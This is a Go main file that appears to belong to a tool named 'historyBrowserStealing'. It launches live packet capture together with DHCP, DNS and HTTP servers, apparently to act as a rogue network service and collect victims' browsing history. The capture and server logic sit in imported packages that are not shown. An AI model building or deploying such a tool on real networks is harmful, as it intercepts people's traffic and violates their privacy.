package main

import (
	"bufio"
	"fmt"
	"historyBrowserStealing/dhcp"
	"historyBrowserStealing/dns"
	"historyBrowserStealing/http"
	"historyBrowserStealing/liveCapture"
	"os"
)

func main() {
	channel := make(chan string)
	go liveCapture.StartLiveCapturing()
	go dhcp.StartDHCPServer()
	go dns.StartDNSServer(channel)
	go http.StartHTTPServer(channel)

	fmt.Println("Press any key to exit...")
	bufio.NewReader(os.Stdin).ReadByte()
	fmt.Println("Exit programm. Goodbye!")
}
